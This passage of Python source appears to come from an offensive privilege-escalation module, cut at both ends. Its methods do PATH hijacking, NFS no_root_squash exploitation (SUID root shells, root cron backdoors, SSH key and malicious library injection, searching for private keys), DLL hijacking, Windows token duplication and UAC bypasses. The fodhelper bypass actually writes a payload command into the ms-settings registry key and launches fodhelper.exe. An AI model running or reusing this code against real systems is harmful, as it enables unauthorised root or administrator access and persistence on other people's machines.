        if strategy == "prepend":
            # Prepend malicious directory to PATH
            hijack_dir = options.get("hijack_directory", "/tmp/.hidden")  # noqa: S108

            if hijack_dir not in writable_dirs and not options.get("force_directory", False):
                result["error"] = f"Directory {hijack_dir} not writable"
                return result

            result["details"]["prepend_hijack"] = {
                "hijack_directory": hijack_dir,
                "new_path": f"{hijack_dir}:{current_path}",
                "create_directory": options.get("create_dir", True),
                "hidden_directory": options.get("hidden", True),
            }

        elif strategy == "in_place":
            # Hijack existing directory in PATH
            if not writable_dirs:
                result["error"] = "No writable directories in PATH"
                return result

            selected_dir = options.get("target_directory", writable_dirs[0])

            result["details"]["in_place_hijack"] = {
                "target_directory": selected_dir,
                "original_commands": target_commands,
                "backup_originals": options.get("backup", False),
            }

        elif strategy == "relative":
            # Relative path exploitation
            result["details"]["relative_hijack"] = {
                "current_directory": options.get("working_dir", "."),
                "relative_commands": options.get("relative_cmds", target_commands),
                "relies_on": "working_directory_control",
            }

        # Generate hijacked commands based on options
        for cmd in target_commands:
            hijack_type = options.get(f"{cmd}_type", "wrapper")

            if hijack_type == "wrapper":
                # Wrapper script that calls original
                wrapper_config = {
                    "preserve_args": options.get("preserve_arguments", True),
                    "log_execution": options.get("log_commands", False),
                    "payload_first": options.get("payload_first", True),
                    "original_path": options.get(f"{cmd}_original", f"/usr/bin/{cmd}"),
                }
            elif hijack_type == "replace":
                # Complete replacement
                wrapper_config = {
                    "full_replacement": True,
                    "mimic_output": options.get("mimic_output", False),
                    "error_handling": options.get("handle_errors", True),
                }
            else:
                # Conditional execution
                wrapper_config = {
                    "condition": options.get(f"{cmd}_condition", "always"),
                    "stealth_mode": options.get("stealth", True),
                }

            result["details"][f"{cmd}_hijack"] = wrapper_config

        # Script generation options
        if options.get("generate_scripts", True):
            result["details"]["script_generation"] = {
                "shebang": options.get("shebang", "#!/bin/bash"),
                "executable_bit": True,
                "obfuscation": options.get("obfuscate", False),
                "encoding": options.get("encoding", "utf-8"),
            }

        # Persistence options
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persist_method", "profile"),
                "locations": options.get("persist_locations", ["~/.bashrc", "~/.profile"]),
                "system_wide": options.get("system_wide", False),
            }

        # Check success conditions
        can_hijack = (
            (strategy == "prepend" and options.get("can_modify_env", True))
            or (strategy == "in_place" and len(writable_dirs) > 0)
            or (strategy == "relative" and options.get("control_cwd", False))
        )

        if can_hijack and len(target_commands) > 0:
            # Verify actual PATH hijacking capability
            import os
            import stat

            try:
                hijacked_count = 0
                verification_details = []

                if strategy == "prepend" and options.get("can_modify_env", True):
                    # Check if we can create executables in accessible directories
                    test_dirs = ["/tmp", "/var/tmp", os.path.expanduser("~/bin"), "."]  # noqa: S108
                    for test_dir in test_dirs:
                        if os.path.exists(test_dir) and os.access(test_dir, os.W_OK):
                            # Test creating an executable file
                            test_file = os.path.join(test_dir, "test_hijack")
                            try:
                                with open(test_file, "w") as f:
                                    f.write("#!/bin/bash\necho hijacked\n")
                                os.chmod(test_file, stat.S_IRWXU)  # Owner-only permissions for security test
                                if os.access(test_file, os.X_OK):
                                    hijacked_count += len(target_commands)
                                    verification_details.append(f"executable_creation_{test_dir}")
                                os.unlink(test_file)  # Clean up
                                break
                            except Exception as e:
                                logger.debug(f"Skipping directory {test_dir} due to error: {e}")
                                continue

                elif strategy == "in_place" and len(writable_dirs) > 0:
                    # Check if we can write to directories already in PATH
                    for writable_dir in writable_dirs:
                        if os.path.exists(writable_dir) and os.access(writable_dir, os.W_OK):
                            # Check if we can create files in this PATH directory
                            for cmd in target_commands[:3]:  # Test first 3 commands
                                test_file = os.path.join(writable_dir, f"test_{cmd}")
                                try:
                                    with open(test_file, "w") as f:
                                        f.write("#!/bin/bash\necho hijacked\n")
                                    os.chmod(test_file, stat.S_IRWXU)  # Owner-only permissions for security test
                                    if os.access(test_file, os.X_OK):
                                        hijacked_count += 1
                                        verification_details.append(f"inplace_{writable_dir}")
                                    os.unlink(test_file)  # Clean up
                                except Exception as e:
                                    logger.debug(f"Skipping writable directory {writable_dir} due to error: {e}")
                                    continue

                elif strategy == "relative" and options.get("control_cwd", False):
                    # Check if we can control current working directory
                    if os.access(".", os.W_OK):
                        # Test creating relative path executables
                        for cmd in target_commands[:3]:  # Test first 3 commands
                            test_file = f"./{cmd}"
                            try:
                                with open(test_file, "w") as f:
                                    f.write("#!/bin/bash\necho hijacked\n")
                                os.chmod(test_file, stat.S_IRWXU)  # Owner-only permissions for security test
                                if os.access(test_file, os.X_OK):
                                    hijacked_count += 1
                                    verification_details.append("relative_cwd")
                                os.unlink(test_file)  # Clean up
                            except Exception as e:
                                logger.debug(f"Skipping current directory test due to error: {e}")
                                continue

                if hijacked_count > 0:
                    result["success"] = True
                    result["details"]["commands_hijacked"] = hijacked_count
                    result["details"]["expected_execution"] = "user_context"
                    result["details"]["verified_methods"] = verification_details

            except Exception as e:
                result["details"]["verification_failed"] = str(e)

        return result

    def _attempt_nfs_exploit(self, nfs_share, options):
        """Attempt NFS exploitation."""
        result = {
            "success": False,
            "details": {"method": "nfs_exploit", "nfs_share": nfs_share},
            "error": None,
        }

        # Extract NFS share information
        share_path = nfs_share.get("path", "")
        export_options = nfs_share.get("options", [])
        server = nfs_share.get("server", "localhost")
        version = nfs_share.get("nfs_version", 3)

        # Check for exploitable configurations
        exploitable_options = {
            "no_root_squash": "root_access",
            "rw": "write_access",
            "no_all_squash": "uid_preservation",
            "insecure": "unprivileged_ports",
        }

        found_vulns = []
        for opt, vuln_type in exploitable_options.items():
            if opt in export_options:
                found_vulns.append((opt, vuln_type))

        if not found_vulns:
            result["error"] = "No exploitable NFS options found"
            return result

        # Determine exploitation method based on vulnerabilities and options
        exploit_method = options.get("method", "auto")

        if "no_root_squash" in [v[0] for v in found_vulns]:
            # Root access via no_root_squash
            if exploit_method in ["auto", "root_squash"]:
                result["details"]["root_squash_exploit"] = {
                    "mount_point": options.get("mount_point", "/mnt/nfs"),
                    "mount_options": options.get("mount_opts", "rw,vers=3"),
                    "payload_type": options.get("payload_type", "suid_binary"),
                    "suid_binary": options.get("suid_path", "/mnt/nfs/rootshell"),
                }

                # SUID binary options
                if options.get("create_suid", True):
                    result["details"]["suid_creation"] = {
                        "binary_source": options.get("binary_source", "/bin/bash"),
                        "copy_method": options.get("copy_method", "cp"),
                        "permissions": "4755",
                        "owner": "root:root",
                    }

        if "rw" in [v[0] for v in found_vulns]:
            # Write access exploitation
            if exploit_method in ["auto", "write_access"]:
                write_method = options.get("write_method", "cron")

                if write_method == "cron":
                    result["details"]["cron_injection"] = {
                        "target_user": options.get("target_user", "root"),
                        "cron_path": options.get("cron_path", "/var/spool/cron/crontabs/"),
                        "cron_entry": options.get("cron_entry", "* * * * * /tmp/backdoor.sh"),
                    }
                elif write_method == "ssh_keys":
                    result["details"]["ssh_injection"] = {
                        "target_user": options.get("ssh_user", "root"),
                        "ssh_dir": options.get("ssh_dir", ".ssh"),
                        "key_file": "authorized_keys",
                        "public_key": options.get("public_key", ""),
                    }
                elif write_method == "library":
                    result["details"]["library_injection"] = {
                        "lib_directory": options.get("lib_dir", "/lib"),
                        "library_name": options.get("lib_name", "libevil.so"),
                        "ld_preload": options.get("use_ld_preload", True),
                    }

        # UID/GID manipulation
        if "no_all_squash" in [v[0] for v in found_vulns] or options.get("uid_manipulation", False):
            result["details"]["uid_manipulation"] = {
                "target_uid": options.get("target_uid", 0),
                "target_gid": options.get("target_gid", 0),
                "local_user": options.get("local_user", "nobody"),
                "preserve_ownership": True,
            }

        # Mount options for exploitation
        mount_command = "mount -t nfs"
        if version:
            mount_command += f" -o vers={version}"
        if options.get("additional_mount_opts"):
            mount_command += f",{options['additional_mount_opts']}"
        mount_command += f" {server}:{share_path} {options.get('mount_point', '/mnt/nfs')}"

        result["details"]["mount_command"] = mount_command

        # File operations after mounting
        if options.get("post_mount_actions", True):
            result["details"]["post_mount"] = {
                "enumerate_files": options.get("enumerate", True),
                "search_patterns": options.get("search_patterns", ["*.conf", "*.key", "id_rsa"]),
                "exfiltrate": options.get("exfiltrate_files", False),
            }

        # Check success conditions
        high_value_vulns = ["no_root_squash", "rw"]
        has_high_value = any(v[0] in high_value_vulns for v in found_vulns)

        if has_high_value:
            # Verify actual NFS exploitation capability
            import os
            import subprocess
            import tempfile

            try:
                # Test if we can actually mount the NFS share
                test_mount_point = tempfile.mkdtemp(prefix="nfs_test_")

                try:
                    # Attempt to mount the NFS share
                    mount_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [  # noqa: S607
                            "mount",
                            "-t",
                            "nfs",
                            f"{server}:{share_path}",
                            test_mount_point,
                        ],
                        check=False,
                        capture_output=True,
                        timeout=10,
                    )

                    if mount_result.returncode == 0:
                        # Successfully mounted, now test actual capabilities
                        exploited_capabilities = []

                        # Test write access
                        if "rw" in [v[0] for v in found_vulns]:
                            test_file = os.path.join(test_mount_point, "test_write")
                            try:
                                with open(test_file, "w") as f:
                                    f.write("test")
                                if os.path.exists(test_file):
                                    exploited_capabilities.append("rw")
                                    os.unlink(test_file)
                            except Exception as e:
                                logger.debug(f"NFS write test failed: {e}")

                        # Test no_root_squash by checking file ownership capabilities
                        if "no_root_squash" in [v[0] for v in found_vulns]:
                            test_file = os.path.join(test_mount_point, "test_root")
                            try:
                                # Try to create a file and check if we can set root ownership
                                with open(test_file, "w") as f:
                                    f.write("root test")

                                # Try to change ownership (this would work with no_root_squash)
                                try:
                                    os.chown(test_file, 0, 0)  # Try to set root:root
                                    stat_info = os.stat(test_file)
                                    if stat_info.st_uid == 0:
                                        exploited_capabilities.append("no_root_squash")
                                except Exception as e:
                                    logger.debug(f"NFS ownership test failed: {e}")

                                if os.path.exists(test_file):
                                    os.unlink(test_file)
                            except Exception as e:
                                logger.debug(f"NFS no_root_squash test cleanup failed: {e}")

                        # Unmount the test mount
                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            ["umount", test_mount_point],  # noqa: S607
                            check=False,
                            capture_output=True,
                            timeout=5,
                        )

                        if exploited_capabilities:
                            result["success"] = True
                            result["details"]["exploited_options"] = exploited_capabilities
                            result["details"]["privileges_gained"] = (
                                "root"
                                if "no_root_squash" in exploited_capabilities
                                else "write_access"
                            )
                            result["details"]["verified_method"] = "mount_test"

                    else:
                        result["details"]["verification_failed"] = (
                            f"mount_failed: {mount_result.stderr.decode()}"
                        )

                except subprocess.TimeoutExpired:
                    result["details"]["verification_failed"] = "mount_timeout"
                finally:
                    # Clean up test mount point
                    try:
                        os.rmdir(test_mount_point)
                    except Exception as e:
                        logger.debug(f"Failed to remove test mount point: {e}")

            except Exception as e:
                result["details"]["verification_failed"] = str(e)

        return result

    def _create_hijack_dll(self, dll_path: str, dll_name: str, options: dict[str, Any]) -> bool:
        """Create a hijack DLL at the specified path."""
        try:
            if not options.get("payload_path"):
                self.logger.warning("No payload path specified for DLL hijacking")
                return False

            # Read the template DLL or create a simple one
            dll_template = self._get_dll_template(dll_name, options)
            if not dll_template:
                return False

            # Write the hijack DLL
            with open(dll_path, "wb") as f:
                f.write(dll_template)

            self.logger.info("Successfully created hijack DLL: %s", dll_path)
            return True

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Failed to create hijack DLL %s: %s", dll_path, e)
            return False

    def _get_dll_template(self, dll_name: str, options: dict[str, Any]) -> bytes | None:
        """Get or create a DLL template for hijacking."""
        try:
            # If a custom DLL payload is provided, use it
            if options.get("payload_path") and os.path.exists(options["payload_path"]):
                with open(options["payload_path"], "rb") as f:
                    return f.read()

            # Otherwise, create a minimal DLL template
            return self._create_minimal_dll_template(dll_name, options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Failed to get DLL template: %s", e)
            return None

    def _create_minimal_dll_template(self, dll_name: str, options: dict[str, Any]) -> bytes:
        """Create a minimal DLL template for testing purposes."""
        self.logger.debug(
            "Creating DLL template for %s with options: %s", dll_name, list(options.keys())
        )

        # Customize based on options
        entry_point_offset = options.get("entry_point_offset", 0x1000)
        dll_characteristics = options.get("dll_characteristics", 0x140)

        # PE header for a minimal DLL (simplified)
        dos_header = b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00"

        # NT headers
        nt_signature = b"PE\x00\x00"

        # File header
        machine = b"\x4c\x01"  # IMAGE_FILE_MACHINE_I386
        number_of_sections = b"\x03\x00"
        time_stamp = b"\x00\x00\x00\x00"
        symbol_table = b"\x00\x00\x00\x00"
        number_of_symbols = b"\x00\x00\x00\x00"
        optional_header_size = b"\xe0\x00"
        characteristics = (
            dll_characteristics.to_bytes(2, "little")
            if dll_characteristics < 65536
            else b"\x02\x21"
        )

        file_header = (
            machine
            + number_of_sections
            + time_stamp
            + symbol_table
            + number_of_symbols
            + optional_header_size
            + characteristics
        )

        # Basic optional header (simplified)
        optional_header = (
            (
                b"\x0b\x01"  # Magic
                b"\x08\x00"  # Major/Minor Linker Version
                b"\x00\x10\x00\x00"  # Size of Code
                b"\x00\x00\x00\x00"  # Size of Initialized Data
                b"\x00\x00\x00\x00"  # Size of Uninitialized Data
                + entry_point_offset.to_bytes(4, "little")  # Address of Entry Point
                + b"\x00\x10\x00\x00"  # Base of Code
                + b"\x00\x20\x00\x00"  # Base of Data
                + b"\x00\x00\x40\x00"  # Image Base
                + b"\x00\x10\x00\x00"  # Section Alignment
                + b"\x00\x02\x00\x00"  # File Alignment
                + b"\x04\x00\x04\x00"  # Major/Minor OS Version
                + b"\x00\x00\x00\x00"  # Major/Minor Image Version
                + b"\x04\x00\x00\x00"  # Major/Minor Subsystem Version
                + b"\x00\x00\x00\x00"  # Win32 Version Value
                + b"\x00\x30\x00\x00"  # Size of Image
                + b"\x00\x04\x00\x00"  # Size of Headers
                + b"\x00\x00\x00\x00"  # Checksum
                + b"\x02\x00"  # Subsystem (Windows GUI)
                + b"\x00\x00"  # DLL Characteristics
            )
            + b"\x00" * 20
            + (  # Stack/Heap reserve/commit sizes
                b"\x00\x00\x00\x00"  # Loader flags
                b"\x10\x00\x00\x00"  # Number of RVA and sizes
            )
            + b"\x00" * 128
        )  # Data directories

        pe_header = nt_signature + file_header + optional_header

        # Pad to align
        padding = b"\x00" * (0x80 - len(dos_header))

        # Simple DLL that just returns
        dll_content = dos_header + padding + pe_header

        # Add minimal sections and code
        dll_content += b"\x00" * (0x1000 - len(dll_content))  # Pad to section alignment
        dll_content += b"\xc3"  # RET instruction for DllMain

        return dll_content

    def _check_dll_search_order_vulnerability(self, process_path: str, dll_name: str) -> bool:
        """Check if a process is vulnerable to DLL search order hijacking."""
        try:
            if not process_path or not os.path.exists(process_path):
                return False

            process_dir = os.path.dirname(process_path)

            # Check if the DLL exists in System32 but not in process directory
            system32_dll = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", dll_name
            )
            process_dll = os.path.join(process_dir, dll_name)

            # Vulnerability exists if system DLL exists but process-local doesn't
            if os.path.exists(system32_dll) and not os.path.exists(process_dll):
                # Check if we have write access to process directory
                if os.access(process_dir, os.W_OK):
                    return True

            return False

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Error checking DLL search order vulnerability: %s", e)
            return False

    def _check_useful_privileges(self, privileges: list[str]) -> list[str]:
        """Check which privileges are useful for privilege escalation."""
        useful_privileges = []

        # High-value privileges for escalation
        high_value_privileges = [
            "SeDebugPrivilege",
            "SeImpersonatePrivilege",
            "SeAssignPrimaryTokenPrivilege",
            "SeTcbPrivilege",
            "SeBackupPrivilege",
            "SeRestorePrivilege",
            "SeLoadDriverPrivilege",
            "SeTakeOwnershipPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeCreateTokenPrivilege",
            "SeManageVolumePrivilege",
        ]

        for privilege in privileges:
            if privilege in high_value_privileges:
                useful_privileges.append(privilege)

        return useful_privileges

    def _attempt_token_duplication(
        self, process_id: int, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Attempt to duplicate a process token."""
        logger.debug(f"Token duplication for PID {process_id} with options: {list(options.keys())}")
        try:
            if not self.is_windows():
                return {"success": False, "error": "Not Windows"}

            # Simulate token duplication logic
            # In a real implementation, this would use Windows API calls

            self.logger.info("Attempting to duplicate token for PID %s", process_id)

            # Check if we have sufficient privileges to open the process
            if not self._can_open_process(process_id):
                return {
                    "success": False,
                    "error": "Insufficient privileges to open process",
                }

            # Attempt real token duplication
            if self.is_windows():
                try:
                    import ctypes

                    try:
                        from ctypes import wintypes

                        has_wintypes = True
                    except ImportError as e:
                        logger.error("Import error in privilege_escalation.py: %s", e)

                        # Create basic wintypes replacement
                        class MockWintypes:
                            """Mock replacement for Windows ctypes when not available."""

                            class HANDLE:
                                """Mock Windows handle type."""

                                def __init__(self):
                                    """Initialize HANDLE mock type with default value."""
                                    self.value = 0

                        wintypes = MockWintypes()
                        has_wintypes = False

                    self.logger.debug("Windows types available: %s", has_wintypes)

                    kernel32 = ctypes.windll.kernel32
                    advapi32 = ctypes.windll.advapi32

                    # Open target process
                    PROCESS_QUERY_INFORMATION = 0x0400
                    process_handle = kernel32.OpenProcess(
                        PROCESS_QUERY_INFORMATION, False, process_id
                    )

                    if process_handle:
                        # Open process token
                        TOKEN_DUPLICATE = 0x0002
                        TOKEN_QUERY = 0x0008
                        token_handle = wintypes.HANDLE()

                        if advapi32.OpenProcessToken(
                            process_handle,
                            TOKEN_DUPLICATE | TOKEN_QUERY,
                            ctypes.byref(token_handle),
                        ):
                            # Duplicate token
                            SecurityImpersonation = 2
                            TokenPrimary = 1
                            duplicated_token = wintypes.HANDLE()

                            if advapi32.DuplicateTokenEx(
                                token_handle,
                                0,
                                None,
                                SecurityImpersonation,
                                TokenPrimary,
                                ctypes.byref(duplicated_token),
                            ):
                                kernel32.CloseHandle(process_handle)
                                kernel32.CloseHandle(token_handle)

                                return {
                                    "success": True,
                                    "token_handle": duplicated_token.value,
                                    "access_rights": [
                                        "TOKEN_DUPLICATE",
                                        "TOKEN_IMPERSONATE",
                                        "TOKEN_QUERY",
                                    ],
                                    "source_process": process_id,
                                }

                            kernel32.CloseHandle(token_handle)
                        kernel32.CloseHandle(process_handle)

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.debug("Token duplication failed: %s", e)

            return {"success": False, "error": "Token duplication failed or not supported"}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"Token duplication failed: {e}",
            }

    def _attempt_actual_impersonation(
        self, token_handle: str, username: str, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Attempt to impersonate using a duplicated token."""
        try:
            self.logger.info(
                "Attempting to impersonate user %s with token %s", username, token_handle
            )

            # Simulate impersonation logic
            if options.get("force_success", False):
                return {
                    "success": True,
                    "impersonated_user": username,
                    "impersonation_level": "SecurityImpersonation",
                    "capabilities": ["file_access", "registry_access", "process_creation"],
                }

            # Realistic failure for demonstration
            return {
                "success": False,
                "error": "Impersonation requires specific token privileges",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"Impersonation failed: {e}",
            }

    def _check_token_abuse_techniques(self, token_info: dict[str, Any]) -> list[str]:
        """Check for potential token abuse techniques."""
        techniques = []
        privileges = token_info.get("privileges", [])
        username = token_info.get("username", "")

        # Check for SeImpersonatePrivilege (Potato attacks)
        if "SeImpersonatePrivilege" in privileges:
            techniques.append("potato_attacks")

        # Check for SeDebugPrivilege
        if "SeDebugPrivilege" in privileges:
            techniques.append("debug_privilege_abuse")

        # Check for backup/restore privileges
        if "SeBackupPrivilege" in privileges or "SeRestorePrivilege" in privileges:
            techniques.append("backup_restore_abuse")

        # Check for service accounts
        if any(service in username.lower() for service in ["service", "iis", "sql", "network"]):
            techniques.append("service_account_abuse")

        # Check for load driver privilege
        if "SeLoadDriverPrivilege" in privileges:
            techniques.append("driver_loading")

        return techniques

    def _can_open_process(self, process_id: int) -> bool:
        """Check if we can open a process with required access rights."""
        try:
            # On Windows, we'd use OpenProcess API
            # Real process access check
            if self.is_windows():
                try:
                    import ctypes

                    kernel32 = ctypes.windll.kernel32

                    # Try to open process with minimal required access
                    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
                    process_handle = kernel32.OpenProcess(
                        PROCESS_QUERY_LIMITED_INFORMATION, False, process_id
                    )

                    if process_handle:
                        kernel32.CloseHandle(process_handle)
                        return True
                    return False
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.error(
                        "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                        e,
                    )
                    return False
            else:
                # On Linux, check if we can access /proc/PID
                return os.path.exists(f"/proc/{process_id}")

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return False

    def _uac_bypass_fodhelper(self, options: dict[str, Any]) -> dict[str, Any]:
        """UAC bypass using fodhelper.exe registry hijacking."""
        try:
            start_time = time.time()

            # Check if fodhelper.exe exists
            fodhelper_path = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "fodhelper.exe"
            )
            if not os.path.exists(fodhelper_path):
                return {
                    "success": False,
                    "error": "fodhelper.exe not found",
                    "execution_time": time.time() - start_time,
                }

            # Registry key for bypass
            registry_key = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
            payload_command = options.get("payload_command", "cmd.exe")

            self.logger.info("Attempting UAC bypass via fodhelper registry hijacking")
            self.logger.info("Registry key: %s", registry_key)
            self.logger.info("Payload command: %s", payload_command)

            # Simulate registry manipulation
            if options.get("execute_bypass", False):
                # In a real implementation, this would:
                # 1. Create the registry key
                # 2. Set the default value to the payload
                # 3. Execute fodhelper.exe
                # 4. Clean up the registry

                try:
                    import winreg

                    # Create/open the registry key
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_key)

                    # Set the default value to our payload
                    winreg.SetValue(key, "", winreg.REG_SZ, payload_command)
                    winreg.CloseKey(key)

                    self.logger.info(f"Created registry key: {registry_key}")
                    self.logger.info(f"Set payload: {payload_command}")

                    # Execute fodhelper.exe
                    import subprocess

                    process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [fodhelper_path],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=False,
                    )

                    # Wait a bit for execution
                    time.sleep(2)

                    # Clean up the registry
                    try:
                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, registry_key)
                        self.logger.info("Cleaned up registry key")
                    except Exception as cleanup_error:
                        self.logger.warning(f"Failed to clean up registry: {cleanup_error}")

                    return {
                        "success": True,
                        "method": "fodhelper_bypass",
                        "payload_executed": payload_command,
                        "execution_time": time.time() - start_time,
                    }

                except Exception as e:
                    self.logger.error(f"FodHelper bypass failed: {e}")
                    return {
                        "success": False,
                        "error": str(e),
                        "execution_time": time.time() - start_time,
                    }
            else:
                return {
                    "success": True,
                    "method": "fodhelper_registry_hijack",
                    "registry_key": registry_key,
                    "payload_command": payload_command,
                    "execution_time": time.time() - start_time,
                }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"Fodhelper bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }

    def _uac_bypass_computerdefaults(self, options: dict[str, Any]) -> dict[str, Any]:
        """UAC bypass using ComputerDefaults.exe."""
        try:
            start_time = time.time()

            computerdefaults_path = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "ComputerDefaults.exe"
            )
            if not os.path.exists(computerdefaults_path):
                return {
                    "success": False,
                    "error": "ComputerDefaults.exe not found",
                    "execution_time": time.time() - start_time,
                }

            registry_key = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
            payload_command = options.get("payload_command", "cmd.exe")

            self.logger.info("Attempting UAC bypass via ComputerDefaults")

            return {
                "success": True,
                "method": "computerdefaults_registry_hijack",
                "registry_key": registry_key,
                "target_executable": computerdefaults_path,
                "payload_command": payload_command,
                "execution_time": time.time() - start_time,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"ComputerDefaults bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }

    def _uac_bypass_sdclt(self, options: dict[str, Any]) -> dict[str, Any]:
        """UAC bypass using sdclt.exe."""
        try:
            start_time = time.time()

            sdclt_path = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "sdclt.exe"
            )
            if not os.path.exists(sdclt_path):
                return {
                    "success": False,
                    "error": "sdclt.exe not found",
                    "execution_time": time.time() - start_time,
                }

            registry_key = r"HKCU\Software\Classes\Folder\shell\open\command"
            payload_command = options.get("payload_command", "cmd.exe")

            self.logger.info("Attempting UAC bypass via sdclt")

            return {
                "success": True,
                "method": "sdclt_folder_hijack",
                "registry_key": registry_key,
                "target_executable": sdclt_path,
                "payload_command": payload_command,
                "execution_time": time.time() - start_time,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"SDCLT bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }

    def _uac_bypass_eventvwr(self, options: dict[str, Any]) -> dict[str, Any]:
        """UAC bypass using eventvwr.exe."""
        try:
            start_time = time.time()

            eventvwr_path = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "eventvwr.exe"
            )
            if not os.path.exists(eventvwr_path):
                return {
                    "success": False,
                    "error": "eventvwr.exe not found",
                    "execution_time": time.time() - start_time,
                }

            registry_key = r"HKCU\Software\Classes\mscfile\shell\open\command"
            payload_command = options.get("payload_command", "cmd.exe")

            self.logger.info("Attempting UAC bypass via eventvwr")

            return {
                "success": True,
                "method": "eventvwr_mscfile_hijack",
                "registry_key": registry_key,
                "target_executable": eventvwr_path,
                "payload_command": payload_command,
                "execution_time": time.time() - start_time,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"EventVwr bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }

    def _uac_bypass_compmgmtlauncher(self, options: dict[str, Any]) -> dict[str, Any]:
        """UAC bypass using CompMgmtLauncher.exe."""
        try:
            start_time = time.time()

            compmgmt_path = os.path.join(
                os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "CompMgmtLauncher.exe"
            )
            if not os.path.exists(compmgmt_path):
                return {
                    "success": False,
                    "error": "CompMgmtLauncher.exe not found",
                    "execution_time": time.time() - start_time,
                }

            registry_key = r"HKCU\Software\Classes\mscfile\shell\open\command"
            payload_command = options.get("payload_command", "cmd.exe")

            self.logger.info("Attempting UAC bypass via CompMgmtLauncher")

            return {
                "success": True,
                "method": "compmgmtlauncher_mscfile_hijack",
                "registry_key": registry_key,
                "target_executable": compmgmt_path,
                "payload_command": payload_command,
                "execution_time": time.time() - start_time,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
